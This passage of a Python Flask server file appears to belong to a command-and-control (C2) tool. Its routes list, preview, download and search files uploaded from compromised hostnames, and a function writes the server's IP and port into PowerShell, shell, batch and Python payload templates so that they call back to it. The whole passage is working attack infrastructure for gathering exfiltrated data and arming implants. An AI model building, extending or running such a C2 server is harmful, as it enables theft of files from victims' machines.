        db.session.add(uploaded_file)
        db.session.commit()
        
        print(f"DEBUG: File uploaded successfully - {original_filename} from {hostname}, size: {file_size} bytes, type: {file_type}")
        
        return jsonify({
            'message': 'File uploaded successfully',
            'file_id': uploaded_file.id,
            'stored_filename': stored_filename,
            'file_size': file_size,
            'file_type': file_type
        })
        
    except Exception as e:
        print(f"DEBUG: Error uploading file: {e}")
        return jsonify({'error': f'Failed to upload file: {str(e)}'}), 500

@app.route('/api/files/list')
def list_uploaded_files():
    """Get list of all uploaded files"""
    try:
        files = UploadedFile.query.order_by(UploadedFile.upload_timestamp.desc()).all()
        
        file_list = []
        for file in files:
            file_info = {
                'id': file.id,
                'hostname': file.hostname,
                'original_filename': file.original_filename,
                'stored_filename': file.stored_filename,
                'file_size': file.file_size,
                'file_type': file.file_type,
                'upload_timestamp': file.upload_timestamp.isoformat(),
                'description': file.description,
                'tags': file.tags,
                'is_processed': file.is_processed,
                'processing_status': file.processing_status
            }
            
            # Check if file still exists on disk
            if os.path.exists(file.file_path):
                file_info['exists'] = True
                file_info['file_size'] = os.path.getsize(file.file_path)
            else:
                file_info['exists'] = False
                file_info['file_size'] = 0
            
            file_list.append(file_info)
        
        return jsonify(file_list)
        
    except Exception as e:
        print(f"DEBUG: Error listing uploaded files: {e}")
        return jsonify({'error': f'Failed to list files: {str(e)}'}), 500

@app.route('/api/files/<int:file_id>')
def get_file_info(file_id):
    """Get information about a specific uploaded file"""
    try:
        file = UploadedFile.query.get(file_id)
        if not file:
            return jsonify({'error': 'File not found'}), 404
        
        file_info = {
            'id': file.id,
            'hostname': file.hostname,
            'original_filename': file.original_filename,
            'stored_filename': file.stored_filename,
            'file_path': file.file_path,
            'file_size': file.file_size,
            'file_type': file.file_type,
            'upload_timestamp': file.upload_timestamp.isoformat(),
            'description': file.description,
            'tags': file.tags,
            'is_processed': file.is_processed,
            'processing_status': file.processing_status
        }
        
        # Check if file exists on disk
        if os.path.exists(file.file_path):
            file_info['exists'] = True
            file_info['actual_size'] = os.path.getsize(file.file_path)
        else:
            file_info['exists'] = False
            file_info['actual_size'] = 0
        
        return jsonify(file_info)
        
    except Exception as e:
        print(f"DEBUG: Error getting file info: {e}")
        return jsonify({'error': f'Failed to get file info: {str(e)}'}), 500

@app.route('/api/files/<int:file_id>/preview')
def preview_uploaded_file(file_id):
    """Preview an uploaded file in the browser"""
    try:
        file = UploadedFile.query.get(file_id)
        if not file:
            return jsonify({'error': 'File not found'}), 404
        
        if not os.path.exists(file.file_path):
            return jsonify({'error': 'File not found on disk'}), 404
        
        # Determine proper MIME type for preview
        filename = file.original_filename.lower()
        if filename.endswith(('.jpg', '.jpeg')):
            mimetype = 'image/jpeg'
        elif filename.endswith('.png'):
            mimetype = 'image/png'
        elif filename.endswith('.gif'):
            mimetype = 'image/gif'
        elif filename.endswith('.pdf'):
            mimetype = 'application/pdf'
        elif filename.endswith(('.mp4', '.avi', '.mov')):
            mimetype = 'video/mp4'
        elif filename.endswith(('.mp3', '.m4a', '.wav')):
            mimetype = 'audio/mpeg'
        elif filename.endswith(('.txt', '.log')):
            mimetype = 'text/plain'
        else:
            mimetype = file.file_type or 'application/octet-stream'
        
        # Debug logging
        print(f"DEBUG: Preview request for file {file.original_filename}")
        print(f"DEBUG: File path: {file.file_path}")
        print(f"DEBUG: Detected MIME type: {mimetype}")
        print(f"DEBUG: File exists: {os.path.exists(file.file_path)}")
        print(f"DEBUG: File size: {os.path.getsize(file.file_path) if os.path.exists(file.file_path) else 'N/A'}")
        
        # Serve file with proper MIME type and cache control
        response = send_from_directory(
            os.path.dirname(file.file_path),
            os.path.basename(file.file_path),
            mimetype=mimetype
        )
        
        # Add cache control headers for images
        if mimetype.startswith('image/'):
            response.headers['Cache-Control'] = 'public, max-age=3600'
            response.headers['Expires'] = '3600'
        
        return response
        
    except Exception as e:
        print(f"DEBUG: Error previewing file: {e}")
        return jsonify({'error': f'Failed to preview file: {str(e)}'}), 500

@app.route('/api/files/<int:file_id>/download')
def download_uploaded_file(file_id):
    """Download an uploaded file"""
    try:
        file = UploadedFile.query.get(file_id)
        if not file:
            return jsonify({'error': 'File not found'}), 404
        
        if not os.path.exists(file.file_path):
            return jsonify({'error': 'File not found on disk'}), 404
        
        return send_from_directory(
            os.path.dirname(file.file_path),
            os.path.basename(file.file_path),
            as_attachment=True,
            download_name=file.original_filename
        )
        
    except Exception as e:
        print(f"DEBUG: Error downloading file: {e}")
        return jsonify({'error': f'Failed to download file: {str(e)}'}), 500



@app.route('/api/files/<int:file_id>/delete', methods=['DELETE'])
def delete_uploaded_file(file_id):
    """Delete an uploaded file"""
    try:
        file = UploadedFile.query.get(file_id)
        if not file:
            return jsonify({'error': 'File not found'}), 404
        
        # Delete file from disk
        if os.path.exists(file.file_path):
            os.remove(file.file_path)
        
        # Delete from database
        db.session.delete(file)
        db.session.commit()
        
        return jsonify({'message': 'File deleted successfully'})
        
    except Exception as e:
        print(f"DEBUG: Error deleting file: {e}")
        return jsonify({'error': f'Failed to delete file: {str(e)}'}), 500

@app.route('/api/files/delete-all', methods=['DELETE'])
def delete_all_uploaded_files():
    """Delete all uploaded files from the C2 server"""
    try:
        # Get all files from database
        files = UploadedFile.query.all()
        
        if not files:
            return jsonify({'message': 'No files to delete', 'deleted_count': 0})
        
        deleted_count = 0
        failed_count = 0
        
        # Delete each file
        for file in files:
            try:
                # Delete file from disk if it exists
                if os.path.exists(file.file_path):
                    os.remove(file.file_path)
                
                # Delete from database
                db.session.delete(file)
                deleted_count += 1
                
            except Exception as e:
                print(f"DEBUG: Error deleting file {file.original_filename}: {e}")
                failed_count += 1
                continue
        
        # Commit all deletions
        db.session.commit()
        
        print(f"DEBUG: Bulk delete completed - {deleted_count} files deleted, {failed_count} failed")
        
        return jsonify({
            'message': f'Bulk delete completed: {deleted_count} files deleted successfully',
            'deleted_count': deleted_count,
            'failed_count': failed_count
        })
        
    except Exception as e:
        print(f"DEBUG: Error during bulk delete: {e}")
        db.session.rollback()
        return jsonify({'error': f'Failed to delete files: {str(e)}'}), 500

@app.route('/api/files/search')
def search_uploaded_files():
    """Search uploaded files by various criteria"""
    try:
        query = request.args.get('q', '')
        hostname = request.args.get('hostname', '')
        file_type = request.args.get('type', '')
        tags = request.args.get('tags', '')
        
        # Build query
        search_query = UploadedFile.query
        
        if query:
            search_query = search_query.filter(
                UploadedFile.original_filename.like(f'%{query}%') |
                UploadedFile.description.like(f'%{query}%')
            )
        
        if hostname:
            search_query = search_query.filter(UploadedFile.hostname == hostname)
        
        if file_type:
            search_query = search_query.filter(UploadedFile.file_type.like(f'%{file_type}%'))
        
        if tags:
            search_query = search_query.filter(UploadedFile.tags.like(f'%{tags}%'))
        
        files = search_query.order_by(UploadedFile.upload_timestamp.desc()).limit(100).all()
        
        file_list = []
        for file in files:
            file_info = {
                'id': file.id,
                'hostname': file.hostname,
                'original_filename': file.original_filename,
                'stored_filename': file.stored_filename,
                'file_size': file.file_size,
                'file_type': file.file_type,
                'upload_timestamp': file.upload_timestamp.isoformat(),
                'description': file.description,
                'tags': file.tags,
                'is_processed': file.is_processed,
                'processing_status': file.processing_status
            }
            
            # Check if file exists on disk
            if os.path.exists(file.file_path):
                file_info['exists'] = True
            else:
                file_info['exists'] = False
            
            file_list.append(file_info)
        
        return jsonify(file_list)
        
    except Exception as e:
        print(f"DEBUG: Error searching files: {e}")
        return jsonify({'error': f'Failed to search files: {str(e)}'}), 500

@app.route('/files')
def files_page():
    """File management page"""
    return render_template('files.html')

@app.route('/api/regenerate-payloads', methods=['POST'])
def regenerate_payloads_api():
    """API endpoint to regenerate payloads with current IP"""
    try:
        success = generate_payloads()
        if success:
            return jsonify({'message': 'Payloads regenerated successfully'})
        else:
            return jsonify({'error': 'Failed to regenerate payloads'}), 500
    except Exception as e:
        return jsonify({'error': f'Error regenerating payloads: {str(e)}'}), 500

@app.route('/api/current-ip')
def get_current_ip():
    """Get the current IP address and port"""
    try:
        local_ip = get_local_ip()
        return jsonify({
            'ip': local_ip,
            'port': 8084,
            'full_url': f'http://{local_ip}:8084'
        })
    except Exception as e:
        return jsonify({'error': f'Failed to get IP: {str(e)}'}), 500

def get_local_ip():
    """Get the local IP address of the machine"""
    try:
        # Create a socket to get local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1"

def generate_payloads():
    """Generate payloads with current IP address and port"""
    try:
        # Get current IP and port
        local_ip = get_local_ip()
        port = 8084
        
        # Create generated directory if it doesn't exist
        generated_dir = os.path.join('payloads', 'generated')
        os.makedirs(generated_dir, exist_ok=True)
        
        # Get all payload files from the payloads directory
        payloads_dir = 'payloads'
        payload_files = []
        
        for file in os.listdir(payloads_dir):
            if file.endswith(('.ps1', '.sh', '.bat', '.py')) and not file.startswith('.'):
                payload_files.append(file)
        
        print(f"Found {len(payload_files)} payload files to generate")
        
        # Process each payload file
        for payload_file in payload_files:
            try:
                source_path = os.path.join(payloads_dir, payload_file)
                generated_path = os.path.join(generated_dir, payload_file)
                
                # Read the source file
                with open(source_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                # Replace template placeholders with actual values
                modified_content = content.replace('{C2_HOST}', local_ip)
                modified_content = modified_content.replace('{C2_PORT}', str(port))
                
                # Write the generated file
                with open(generated_path, 'w', encoding='utf-8') as f:
                    f.write(modified_content)
                
                print(f"Generated: {payload_file}")
                
            except Exception as e:
                print(f"Error generating {payload_file}: {e}")
                continue
        
        print(f"Payload generation completed. Generated {len(payload_files)} files in {generated_dir}/")
        return True
        
    except Exception as e:
        print(f"Error during payload generation: {e}")
        return False

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    
    # Generate payloads with current IP address
    print("Generating payloads with current IP address...")
    generate_payloads()
    
    app.run(debug=True, host='0.0.0.0', port=8084)

